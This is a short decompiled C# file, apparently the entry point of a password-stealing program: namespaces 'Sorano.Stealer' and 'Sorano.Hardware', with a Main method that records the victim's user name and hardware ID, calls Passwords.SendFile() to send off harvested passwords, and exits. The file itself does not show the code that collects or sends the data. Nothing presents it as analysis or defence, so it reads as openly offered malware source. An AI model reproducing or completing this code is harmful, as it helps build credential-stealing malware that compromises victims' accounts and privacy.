using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Sorano.Hardware;
using Sorano.Stealer;

namespace Sorano
{
	// Token: 0x02000006 RID: 6
	internal static class Prgrm
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00003070 File Offset: 0x00001270
		private static void Main()
		{
			string location = Assembly.GetCallingAssembly().Location;
			string randomFileName = Path.GetRandomFileName();
			RawSettings.Owner = string.Format("{0}", Environment.UserName);
			RawSettings.Version = "1.0.0";
			RawSettings.HWID = Identification.GetId();
			Passwords.SendFile();
			Application.Exit();
		}
	}
}
